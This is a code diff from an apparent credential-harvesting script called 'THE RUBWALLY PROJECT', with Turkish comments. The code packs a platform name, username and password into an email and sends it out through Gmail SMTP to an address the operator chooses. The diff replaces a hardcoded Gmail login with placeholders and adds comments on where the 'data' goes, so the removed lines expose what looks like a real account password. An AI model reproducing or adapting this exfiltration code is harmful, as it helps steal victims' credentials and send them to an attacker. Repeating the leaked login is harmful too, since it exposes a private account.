@@ -14,16 +14,16 @@ def sendMail(to="", sub="", content=""):
     mail = smtplib.SMTP("smtp.gmail.com", 587)
     mail.ehlo()
     mail.starttls()
-    mail.login("rubwally@gmail.com","donttouchthefunc")
+    mail.login("<email>","<password>") # uygulama icin kullanacaginiz email-sifre
     content = 'Subject: {}\n\n{}'.format(sub, content)
-    mail.sendmail("rubwally@gmail.com", to, content)
+    mail.sendmail("<your_email>", to, content) # verilerin gonderilecegi e-mail adresi (kendi e-mailiniz olabilir)
     print("mail gonderildi.")
 
 
 content = "Platform : "+platform+"\n\nKullanici adi : "+username+"\nSifre : "+password
 subject = "THE RUBWALLY PROJECT"
 
-sendMail("rubwally@gmail.com",subject,content)
+sendMail("<your_email>",subject,content)
 
 #print(mail,password)
 
